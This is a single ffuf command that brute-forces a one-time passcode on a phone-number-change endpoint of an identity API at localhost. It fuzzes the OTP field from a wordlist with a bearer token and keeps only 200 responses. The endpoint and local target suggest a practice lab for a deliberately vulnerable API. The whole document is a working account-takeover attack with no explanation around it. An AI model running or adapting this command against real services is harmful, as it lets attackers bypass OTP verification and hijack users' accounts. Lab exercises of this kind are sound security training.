```
ffuf -w otp.txt:FUZZ \
  -u http://localhost:8888/identity/api/v2/user/verify-phone-otp \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_ACTUAL_TOKEN" \
  -d '{"old_number":"7329493272","new_number":"0823132421","otp":"FUZZ"}' \
  -mc 200  #status 200 (OK)
```